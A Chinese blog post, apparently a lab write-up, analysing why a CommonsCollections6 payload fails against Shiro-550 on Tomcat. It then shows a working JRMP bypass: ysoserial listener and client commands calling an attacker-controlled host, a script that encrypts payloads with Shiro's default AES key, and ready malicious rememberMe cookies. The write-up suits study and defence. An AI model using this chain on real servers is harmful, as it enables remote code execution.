---
created: 2024-09-30T05:46:00+00:00
categories:
  - 技术研究
tags:
  - RCE
  - Java安全
updated: 2023-03-20T00:00:00+00:00
date: 2023-01-22T00:00:00+00:00
slug: attacking-shiro550-with-commons-collections
title: 利用Commons Collections攻击Shiro550
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/c4f94bdc-260e-4069-9f10-940bb0fbc96e/18.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=8e534d1bef3c7ab048777d5d0bb76c1e7d01f69c2ee148da41f2c0b31c46e60b&X-Amz-SignedHeaders=host&x-id=GetObject
id: 111906e1-7468-80b4-8170-e19188f37e1d
---

## 引子

在上一篇[《CVE-2016-4437 SHIRO-550 反序列化漏洞》](https://0xf4n9x.github.io/cve-2016-4437-apache-shiro-rce)文章中，由于默认 Shiro 中的 Commons Collections 是不完整的，所以只演示了利用 CommonsBeanutils1 链攻击 Shiro 应用。

现在假设应用中存在完整的 Commons Collections 组件（这种情况在实战环境中也是很常见的），在这种情况下又该如何进行攻击利用？

## 攻击尝试

这里先以 3.2.1 版本的 Commons Collections 为例，我们首先在 Shiro 项目中通过 Maven 引入它的依赖。

```xml
<!-- <https://mvnrepository.com/artifact/commons-collections/commons-collections> -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

跟此前利用 CommonsBeanutils1 的方式一样，对 CommonsCollections6 生成的反序列化数据进行加密和编码，然后构造恶意 HTTP 请求并发送，如下。

```text
GET / HTTP/1.1
Host: 10.11.34.121:8888
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Accept: text/css,*/*;q=0.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: rememberMe=S3zrNOcqSj+w6THQhxdlWBY+m+jymoJVGZcHBexpNAcjdYwLDa7GvhTFXd+ud/s2l2bWYD3k/O3j65r9DEC5YlwGSiisq0L5K0P/J0TEaZ5zpkXeHYJXclKNpEL7y2ZOGLKA3AUA+YN4u8uiCpse/75rEwtdNjjt8ARoxi7//iTEom+YBxe+NCMI0ODcFHTWvPGOHX63EXWM8c9UOWOe9NwTGcOCzD/JPsC5FHcmBJPyV4hUvMH/JViekJfrWOY8aH5tXZJiEJlpskEMa7ZIdSBII0d4BLyFYqqjTyVuM04PQ3RSL4eyhjsjEmfXlZm476i7dBaC98RvC4RdXbF8BXNxiKNV5FY7+h+HLkHTIVtMGRFvBmLDIihzqre0jAUc87M3F34RWQozp5zu3Stoi1JHR2QQ/HSUo0XAv72qyjI6M537QFeoU8zbiEXjAd7CRlMAoNNvbkcEBvrJPqDLW7kI2UzR/AePRoymvxrNJ2OxTBW9nvElItGrsEam8GhROdo0xdylYzw7Qedx7lX8m6S2bQ0vySjro6di7jZcSDWo1XHX5wVcQmpC3stv04yl4baNKOWmYl/fFs8xTX8/YQiJiTac3YQWLvYKq78qkRLveI8+rUce6JACUiFDGUwgTTlx1HJPLtpHoCeCk5Kn6bU4IWcc1UuZMDHrU3S2Cgt6akzXZnb6oqm3nU3aw1kEGQrxBWG5FEutdKDp7+E7N2wOHlBCf6G8WKmruWRSyMVZ1Y3D3Caunazlvp3Fef/7ZHjiXWkSAe7oSm3zIr294MJegKDiv/dOqyTpzB9/i3NfEtplKw1KGInmDOYRfS5amFZIE4R+DNC2itD3ACiVa0cUmuWdFgjbd3v4zmBoCcjfIIz7GDSsBbuwt+VUGTB7DitIfQZ2Iy0KQu3WY3ZIY/VFymMNKVsmJ0NEBOvTMAL3eTsJ1L/Q5sTf7isjqqjAUpXWwTsCaJewW3V+efexvmtlZGnmHwlKUSuaczE1IgS3Kd5Cp1cSXIE4rjyhfsfWrXzDdQOT4p5Ak8LYevW6dhoyxSPdgSB+wyVq5cB4ivg4asOsMBUWGxPWA7nh/52QsDHhtNTGRz60iVxVJV2oYbT03T4oqRxxJpgYu5ZWQjRbDX0YgcLAiOaH4zf7Cs4FxLR5Ge9K6QGfCXdbcqcD9aw91ZJgOsZIW68K990f3pc+dhddFctTTofB8FYO6M4Nn4ZizzZtv5Lv+nwhLmGqXhJLa3wnktTFQLDHLSk6anJ2HagP0aGnLMPk1yPAZlCpG6xqLt9JhLaiMgnuM8cm9PJrNXU9GSxQcJ+W7JSKaWQZDZi3LvOHrS7iXyvvIreBCP2jSLB02qXDqlTLDbADIvhANr1aTe4y3wbCcQJ5P6AO49YST0rROUAVJOfW0x+HputRtrETE5dr6F5CGpMQXhAqRTrOcAtSCg+r05YKnRaHD1F0Dj/0JsUqPyhMWJb9EX6YfiXfUvv79qA5VAILAenJrw0L5EAlx9EssjeItN+sWsR9GGcpxGjNS4JTXk5KwOvR60xYwkj7qYo5CxCiwa/A7VPQIlSLAkautydTaoY=
Connection: close


```

发送后，计算器没任何反应，如上利用似乎并不管用，这是为何？

## 异常分析

回到 IDEA 中检查日志，可发现出现了如下异常报错日志。

```text
Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.
	at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148)
	at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)
```

先看看 ClassResolvingObjectInputStream#resolveClass 方法。

```java
package org.apache.shiro.io;

import org.apache.shiro.util.ClassUtils;
import org.apache.shiro.util.UnknownClassException;

import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;

public class ClassResolvingObjectInputStream extends ObjectInputStream {

    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
        try {
            return ClassUtils.forName(osc.getName());
        } catch (UnknownClassException e) {
            throw new ClassNotFoundException("Unable to load ObjectStreamClass [" + osc + "]: ", e);
        }
    }
}
```

ClassResolvingObjectInputStream 这个类继承 ObjectInputStream，如上 resolveClass 这个方法则是对 ObjectInputStream#resolveClass 的重写。

```java
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
    String name = desc.getName();
    try {
        return Class.forName(name, false, latestUserDefinedLoader());
    } catch (ClassNotFoundException ex) {
        Class<?> cl = primClasses.get(name);
        if (cl != null) {
            return cl;
        } else {
            throw ex;
        }
    }
}
```

由于在反序列化的过程中需要根据序列化数据中的类描述符来加载对应的类，而 resolveClass 方法的作用就是根据给定的 ObjectStreamClass 描述符，解析出对应的类。

对比如上两个 resolveClass，其中的不同点就在于 Shiro 中使用的是 ClassUtils.forName 获取类对象。

```java
ClassUtils.forName(osc.getName());
```

继续进入到 ClassUtils.forName 方法中，该方法会尝试使用三种不同的类加载器加载指定的类，按照如下顺序：

1. 当前线程的上下文类加载器：首先尝试通过 THREAD_CL_ACCESSOR 对象的 loadClass 方法加载类。
2. ClassUtils 类的类加载器：如果无法通过上下文类加载器加载类，则尝试通过 CLASS_CL_ACCESSOR 对象的 loadClass 方法加载类。
3. 系统或应用程序类加载器：如果上述两种类加载器都无法加载类，则尝试通过 SYSTEM_CL_ACCESSOR 对象的 loadClass 方法加载类。

如果无法从任何类加载器加载指定的类，则会抛出 UnknownClassException 异常，表示无法找到指定的类。

首次调用的是 THREAD_CL_ACCESSOR.loadClass 对 fqcn（Fully-Qualified Class Name，完全限定类名）进行加载，我们先来看看这第一种。

```java
public static Class forName(String fqcn) throws UnknownClassException {

    Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn);

    if (clazz == null) {
        if (log.isTraceEnabled()) {
            log.trace("Unable to load class named [" + fqcn +
                    "] from the thread context ClassLoader.  Trying the current ClassLoader...");
        }
        clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);
    }
    if (clazz == null) {
        if (log.isTraceEnabled()) {
            log.trace("Unable to load class named [" + fqcn + "] from the current ClassLoader.  " +
                    "Trying the system/application ClassLoader...");
        }
        clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);
    }
    if (clazz == null) {
        String msg = "Unable to load class named [" + fqcn + "] from the thread context, current, or " +
                "system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.";
        throw new UnknownClassException(msg);
    }

    return clazz;
}

private static final ClassLoaderAccessor THREAD_CL_ACCESSOR = new ExceptionIgnoringAccessor() {
    @Override
    protected ClassLoader doGetClassLoader() throws Throwable {
        return Thread.currentThread().getContextClassLoader();
    }
};
```

根据如上继续进入到 ExceptionIgnoringAccessor 类中的 loadClass 方法。

```java
private static abstract class ExceptionIgnoringAccessor implements ClassLoaderAccessor {

    public Class loadClass(String fqcn) {
        Class clazz = null;
        ClassLoader cl = getClassLoader();
        if (cl != null) {
            try {
                clazz = cl.loadClass(fqcn);
            } catch (ClassNotFoundException e) {
                if (log.isTraceEnabled()) {
                    log.trace("Unable to load clazz named [" + fqcn + "] from class loader [" + cl + "]");
                }
            }
        }
        return clazz;
    }

    protected final ClassLoader getClassLoader() {
        try {
            return doGetClassLoader();
        } catch (Throwable t) {
            if (log.isDebugEnabled()) {
                log.debug("Unable to acquire ClassLoader.", t);
            }
        }
        return null;
    }
}
```

在这个方法中调用了 getClassLoader 方法获取 ClassLoader，即如类中的 doGetClassLoader 方法。

```java
private static final ClassLoaderAccessor THREAD_CL_ACCESSOR = new ExceptionIgnoringAccessor() {
    @Override
    protected ClassLoader doGetClassLoader() throws Throwable {
        return Thread.currentThread().getContextClassLoader();
    }
};
```

最后通过其中 getContextClassLoader 方法获取类加载器。

```java
@CallerSensitive
public ClassLoader getContextClassLoader() {
    if (contextClassLoader == null)
        return null;
    SecurityManager sm = System.getSecurityManager();
    if (sm != null) {
        ClassLoader.checkClassLoaderPermission(contextClassLoader,
                                               Reflection.getCallerClass());
    }
    return contextClassLoader;
}
```

不妨打个端点调试一番，将断点打好了，发送 CC6 的 Payload。

如下图所示，当 fqcn 为 java.util.HashMap 时，继续往下 Step Over 便会成功加载到类。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ee5846fe-c4ba-43e8-80a9-32e3e606b120/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b50209320f10fbdb0ccce773fc4751a90194c73572d86066f2d08e4b3d91e675&X-Amz-SignedHeaders=host&x-id=GetObject)

但当 fqcn 为[Lorg.apache.commons.collections.Transformer;时，继续跟下去，就会抛出 ClassNotFoundException 异常。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/d2a74128-bfd4-4442-b795-a180928bffa2/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=2d011066ec316e3fda29f03a637dc24f7bd2b2435121e0ec695f94e943e50270&X-Amz-SignedHeaders=host&x-id=GetObject)

此处的[L 表示一个数组类型的描述符，;表示类型描述符的结束，所以这里的[Lorg.apache.commons.collections.Transformer;表示的是一个 Transformer 类型的数组。

到此，可能会得出一个不加思索的答案，即 Shiro 中的 Class.loadClass 不支持加载数组类型的类。但仅凭此就得来这样的结论，未免也太过牵强了。

在 Java 中，当一个类加载器收到加载类的请求时，它会首先委托给父类加载器加载，只有当父类加载器无法加载时，才由该类加载器自己加载。这就是双亲委派，它用于类加载的安全性和一致性。

据此，我们先将 Tomcat 的源码导入至 IDEA 项目。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e9d3480a-1207-42ee-aa85-9a7b09048d69/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=cc560bed17150d19e28fab7cff5c43856af93f3bcf5f607ec12a49ca75e6d959&X-Amz-SignedHeaders=host&x-id=GetObject)

再将断点断在 org.apache.shiro.util.ClassUtils#forName，从 THREAD_CL_ACCESSOR.loadClass 跟起。

进入 loadClass 方法，在其中获取到的 ClassLoader 为 ParallelWebappClassLoader，它的父 Classloader 为 URLClassLoader。

```text
ParallelWebappClassLoader
  context: ROOT
  delegate: false
----------> Parent Classloader:
java.net.URLClassLoader@28c4711c
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/92e31ae7-46ae-4909-98cf-f6cd8e73bb84/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=5322faa770423340f5e1d0dac7d84b0837cb08d3715e6974766d69b4937e7c63&X-Amz-SignedHeaders=host&x-id=GetObject)

继续往下，到达 org.apache.catalina.loader.WebappClassLoaderBase#loadClass(java.lang.String, boolean)。在这个方法中，会有两次检查先前加载的本地类缓存，但都未果。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/76d47263-a411-4c0d-a87b-395e0fa2eca8/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=8f7b36892c3b0506bf0d0467a320ab76929cf58f92089054270fdf5c047d5112&X-Amz-SignedHeaders=host&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/7ffcea64-ab84-4f31-8819-e1b0310fb3e8/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=c3e83008d031a57a27b68f743c81e530e9fbdb5593d4b2317f3addecc6558a00&X-Amz-SignedHeaders=host&x-id=GetObject)

接着，会尝试使用系统类加载器加载类，这个时候的 resourceName 成了[Lorg/apache/commons/collections/Transformer;.class。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/aafd7d02-d1da-4264-9b8d-b07cf53d6b1e/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=04c920660ae080fa228492415e6ef8bb3e58cb49d69ad7550e59ecab2263e6ed&X-Amz-SignedHeaders=host&x-id=GetObject)

继续朝下，根据 url = javaseLoader.getResource(resourceName)，url 就会为 null，近而 tryLoadingFromJavaseLoader 会为 false。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/11171dd7-3d6a-4f77-9e0b-e1ba57bf2024/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=208841d4c8df21e791092c50cb84274914080caf2c96b84d831330c5f320aca5&X-Amz-SignedHeaders=host&x-id=GetObject)

继续搜索本地仓库。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ab947a02-dba7-49f0-8b1c-9cc3d14c998c/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=f2c7278eb6068e2ab3d320a1333195c99db04c44d4fddb19886c0e4bba4f2fa7&X-Amz-SignedHeaders=host&x-id=GetObject)

进入到 WebappClassLoaderBase#findClass 方法中。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5f330d57-324a-4712-973c-80667bef7c52/9.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=3f8e7ab6d0e5ea120291e91026043c28b7bb610d49a7cf35abe6ba5cfea25a81&X-Amz-SignedHeaders=host&x-id=GetObject)

一路跟下去，在 855 行对 findClassInternal 方法进行了调用。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/edf35ce7-3620-4ae4-a5c9-42bb390fcce8/10.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=03ad1ea08203cb62b105d569e6459c62c200785c90090c77232697aea843e8df&X-Amz-SignedHeaders=host&x-id=GetObject)

在 findClassInternal 方法中 path 成了/[Lorg/apache/commons/collections/Transformer;.class，这当然是依旧找不到。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/47784076-1e4b-4933-9b78-7194b6a0be19/11.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=7fd367422238391249e72aa269ad3345bdb69d8c46f402d46dc58d1f40081d16&X-Amz-SignedHeaders=host&x-id=GetObject)

只会返回 null 到 findClass 中的 clazz。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a562ed4a-c004-4f6b-917c-2a18ace586d2/12.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=aee55dbf09c71271b22c09413ef386d23b98b80a3a43a0da51aae89fca6ba867&X-Amz-SignedHeaders=host&x-id=GetObject)

findClass 方法也会返回 null 到 loadClass 方法中。继续往下，就会委派到父类加载器进行查找，也就是 URLClassLoader。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5b816916-fabd-48fa-9946-5125d70b82f9/13.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=d9e8d14d6a87d76dc10202e1a2f15eea532a4facf06d6cd33d37ed7fa0c33a82&X-Amz-SignedHeaders=host&x-id=GetObject)

到达 java.lang.Class，但在 URLClassLoader 类加载器中只加载了 Tomcat 下的 lib 包，其中并无所需的 commons-collections-3.2.1.jar。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/e98f0ad9-34ff-41c2-8d60-85691959dc7b/14.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=04aad233267f477ec6f651cc562175c9e9ed858c1078d997575a6de24eda9728&X-Amz-SignedHeaders=host&x-id=GetObject)

```text
[file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-ko.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/el-api.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-es.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-websocket.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/jasper.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/jasper-el.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-util.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-de.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina-storeconfig.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/jsp-api.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina-tribes.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-jni.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/websocket-api.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-coyote.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina-ha.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-api.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/annotations-api.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/jaspic-api.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-zh-CN.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/catalina-ant.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/ecj-4.6.3.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/servlet-api.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-util-scan.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-ja.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-ru.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-jdbc.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-i18n-fr.jar,
file:/opt/apache-tomcat/apache-tomcat-8.5.54/lib/tomcat-dbcp.jar]
```

这就导致了 ClassNotFoundException 异常的抛出。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/4dfb81ee-a39e-45a9-bc11-bb2b74c45cd9/15.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=b1a68a9eb650f6ba2b5f7ce422bbb0a287bb66b8fdd3fcc45e2b9644eab15b96&X-Amz-SignedHeaders=host&x-id=GetObject)

## JRMP

根据如上分析，可得知，当出现 Transformer 数组时，会在本地加载不到相应的类。

在先前[《Java 中动态加载字节码的几种方法》](https://0xf4n9x.github.io/java-classloader)一文中，所介绍的利用 URLClassLoader 加载器远程加载恶意类的知识，此时便能够派上用场了。通过 JRMP 协议，使受害者充当一个 JRMPClient，向攻击者可控的 JRMPListener 进行远程请求加载，利用 URLClassLoader 的一个子类 LoaderHandler#Loader 远程加载攻击者机器上的任意类。当然，更准确地说，应该是通过 RMI 进行远程动态类加载。这里直接使用 ysoserial 工具中的 JRMPListener 来辅助我们进行漏洞利用。

首先需要一台服务器端起一个 JRMPListener，还需要 Shiro 应用程序能够与此服务器进行网络通信，否则 JRMP 这种利用方式就不可取。如下命令对外开放 4444 端口，等待受害端的访问与加载。

```shell
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections6 'open -a Calculator'
* Opening JRMP listener on 4444
```

然后通过 ysoserial 工具生成 JRMPClient 恶意反序列化文件。

```shell
java -jar ysoserial-all.jar JRMPClient 10.11.34.120:4444 > jrmp.ser
```

通过 hexdump 命令查看这个反序列化文件，16 进制内容如下。

```shell
hexdump jrmp.ser
0000000 edac 0500 7d73 0000 0100 1a00 616a 6176
0000010 722e 696d 722e 6765 7369 7274 2e79 6552
0000020 6967 7473 7972 7278 1700 616a 6176 6c2e
0000030 6e61 2e67 6572 6c66 6365 2e74 7250 786f
0000040 e179 da27 cc20 4310 02cb 0100 004c 6801
0000050 0074 4c25 616a 6176 6c2f 6e61 2f67 6572
0000060 6c66 6365 2f74 6e49 6f76 6163 6974 6e6f
0000070 6148 646e 656c 3b72 7078 7273 2d00 616a
0000080 6176 722e 696d 732e 7265 6576 2e72 6552
0000090 6f6d 6574 624f 656a 7463 6e49 6f76 6163
00000a0 6974 6e6f 6148 646e 656c 0072 0000 0000
00000b0 0000 0202 0000 7278 1c00 616a 6176 722e
00000c0 696d 732e 7265 6576 2e72 6552 6f6d 6574
00000d0 624f 656a 7463 61d3 91b4 610c 1e33 0003
00000e0 7800 7770 0035 550a 696e 6163 7473 6552
00000f0 0066 310c 2e30 3131 332e 2e34 3231 0031
0000100 1100 ff5c ffff a3ff e631 0014 0000 0000
0000110 0000 0000 0000 0000 0000 0078
000011b
```

继续使用如下脚本对恶意反序列化数据进行加密编码。

```python
import base64
import uuid
from Crypto.Cipher import AES

with open('./jrmp.ser', 'rb') as f:
    data = f.read()

BS = AES.block_size
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
iv = uuid.uuid4().bytes
encryptor = AES.new(base64.b64decode("kPH+bIxk5D2deZiIxcaaaA=="), AES.MODE_CBC, iv)

print("Cookie: rememberMe={}".format(base64.b64encode(iv + encryptor.encrypt(pad(data))).decode()))
```

最后，发送构造的恶意 HTTP 请求。

```text
GET / HTTP/1.1
Host: 10.11.34.121:8888
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Accept: text/css,*/*;q=0.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: rememberMe=l6bk0fKZSOKMnQMgPMJBrlzEX29JMvW50QgqoZ8DMfvGegWHBeow0LpP3saHN6XVcTy+GcPsKsiqPHLgo1M2QLH1mNgWnEyVuYzr0psKQEVOrDW8VmsDGTbJlOz74QOenoDJjpHaw8aSgSMM0hBBsE5sFUViikkn9DMNIWhK/H6E5tetPbYGY18xuPEW0oQGL2nCikR+R1l72RmzuuRRckMlUxZs1LuxcLYr74+yicCkjV8ZzANeQZsUaKsbbW/A1AtNFIdLXZCZ+D3jrKsxd5b4RkHh1LaqHVVTc4BT0swDp8ArdLLK103zQaFF0km4Q4N54P/F7bZxznlLq6W95fZuY8R8hc+kA8u6nkCkt2y3fuDoknBpAuJClHnOVCYj/lUZFwJ7CnoiPZMk2PDATA==
Connection: close


```

可以观察到 JRMPListener 端会收到来自 Shiro 应用程序的请求。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/92b6d064-4a37-4989-b052-3d1387117a90/16.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=547ef4448942db5641cf10c5ae1900c1417aa2a14eee403ddcd86e60a853678d&X-Amz-SignedHeaders=host&x-id=GetObject)

最终，成功执行命令，弹出计算器。

